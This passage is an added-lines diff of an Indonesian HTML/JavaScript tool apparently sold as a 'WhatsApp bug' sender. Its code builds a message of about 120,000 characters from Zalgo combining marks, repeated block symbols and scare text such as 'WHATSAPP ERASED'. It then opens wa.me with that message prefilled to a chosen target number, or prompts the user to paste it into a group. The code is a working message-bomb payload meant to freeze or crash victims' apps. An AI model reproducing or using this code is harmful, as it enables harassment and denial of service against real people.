+                '🔥🔥🔥 PERINGATAN TINGKAT 2 🔥🔥🔥',
+                '💀💀💀 PERINGATAN TINGKAT 3 💀💀💀',
+                '☢️☢️☢️ PERINGATAN TINGKAT 4 ☢️☢️☢️',
+                '🔄🔄🔄 PERINGATAN TINGKAT 5 🔄🔄🔄',
+                '⚠️⚠️⚠️ PERINGATAN FINAL ⚠️⚠️⚠️'
+            ];
+            warnings.forEach(w => {
+                msg += w + '\n';
+                msg += boxStack + '\n';
+            });
+
+            const lines = [
+                '☠️☠️☠️ SISTEM DESTROYED ☠️☠️☠️',
+                '💀💀💀 WHATSAPP ERASED 💀💀💀',
+                '🔥🔥🔥 VIRUS MUTASI 🔥🔥🔥',
+                '🌀🌀🌀 KUTUKAN ABADI 🌀🌀🌀',
+                '▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬',
+                '✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖✖',
+                '═╬═╬═╬═╬═╬═╬═╬═╬═╬═╬═╬═╬═╬═',
+                'ͤͥͦͧͨͩͪͫͬͭͮͯͤͥͦͧͨͩͪͫͬͭͮͯ',
+                '҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉',
+                '̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸',
+                '̺̻̼͇͈͉͍͎̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏',
+                '░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒',
+                '▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓',
+                '█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒',
+                '☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠',
+                '‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼‼',
+                '❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌',
+                '🔄🔄🔄 LOOP INFINITY 🔄🔄🔄',
+                '💢💢💢 MEMORY OVERKILL 💢💢💢',
+                '⚡⚡⚡ SYSTEM MELTDOWN ⚡⚡⚡'
+            ];
+
+            for (let i = 0; i < 25000; i++) {
+                msg += lines[i % lines.length] + '\n';
+                msg += symbols.join('').repeat(50) + '\n';
+                msg += '̸̷̸̷̸̷'.repeat(200) + '\n';
+                msg += '҉'.repeat(400) + '\n';
+                msg += '▬'.repeat(500) + '\n';
+                msg += ancient + '\n';
+                msg += boxStack + '\n';
+            }
+
+            msg += `\n\n💀💀💀 PESAN INI TIDAK BISA DIBACA 💀💀💀\n`;
+            msg += `🔥 WHATSAPP AKAN MATI TOTAL 🔥\n`;
+            msg += `☢️ VIRUS MENYEBAR KE SEMUA CHAT ☢️\n`;
+            msg += `🔄 LOOP ERROR TAK TERBATAS 🔄\n`;
+            msg += `📮 20 LOKASI PALSU TELAH DIDISTRIBUSIKAN 📮\n\n`;
+            msg += ancient.repeat(50);
+            msg += boxStack.repeat(20);
+
+            return msg.slice(0, 120000);
+        }
+
+        // =========================================================
+        // 9. SEND BUG – 1 KLIK LANGSUNG KE WA + SUCCESS
+        // =========================================================
+        function sendBugAndSuccess(target, type) {
+            const clean = target.replace(/\D/g, '');
+            const msg = generateUltimateBug(target, type);
+            const waLink = `https://wa.me/${clean}?text=${encodeURIComponent(msg)}`;
+
+            // Langsung buka WA (tanpa delay, langsung di klik)
+            window.open(waLink, '_blank');
+
+            // Tampilkan success
+            showPage('success');
+        }
+
+        sendNumberBtn.addEventListener('click', function() {
+            const nomor = targetNumber.value.trim();
+            const bug = bugType.value;
+            if (!nomor) {
+                alert('⚠️ Masukkan nomor target!');
+                return;
+            }
+            sendBugAndSuccess(nomor, bug);
+            console.log(`[BUG] Nomor: ${nomor}, Tipe: ${bug}`);
+        });
+
+        sendGroupBtn.addEventListener('click', function() {
+            const link = groupLink.value.trim();
+            const bugGrup = bugGroupType.value;
+            if (!link) {
+                alert('⚠️ Masukkan link grup!');
+                return;
+            }
+            const msg = generateUltimateBug(link, bugGrup);
+            // Buka link grup
+            window.open(link, '_blank');
+            setTimeout(() => {
+                alert('📋 Copy pesan bug di bawah ini dan kirim ke grup!\n\n' + msg.slice(0, 2000) + '...');
+            }, 1000);
+            showPage('success');
+            console.log(`[BUG GRUP] Link: ${link}, Tipe: ${bugGrup}`);
+        });
+
+        // =========================================================
+        // 10. SUCCESS – OK
+        // =========================================================
+        btnOk.addEventListener('click', function() {
+            showPage('menu');
+        });
+
+        // =========================================================
+        // 11. PAUSE BG VIDEO SAAT INTRO PLAY
+        // =========================================================
+        introVideo.addEventListener('play', function() {
+            bgVideo.pause();
+        });
+        introVideo.addEventListener('pause', function() {
+            bgVideo.play().catch(() => {});
+        });
+        introVideo.addEventListener('ended', function() {
+            bgVideo.play().catch(() => {});
+        });
+
+        // =========================================================
+        // 12. INIT
+        // =========================================================
+        showPage('intro');
+
+        console.log('🔥 KAZ X 999 V9.5 ULTIMATE DESTRUCTION — SIAP! 🔥');
+        console.log('📱 Dev: 085194279722');
+        console.log('🔥 1 KLIK LANGSUNG BUKA WA + SUCCESS!');
+    </script>
+</body>
+</html>
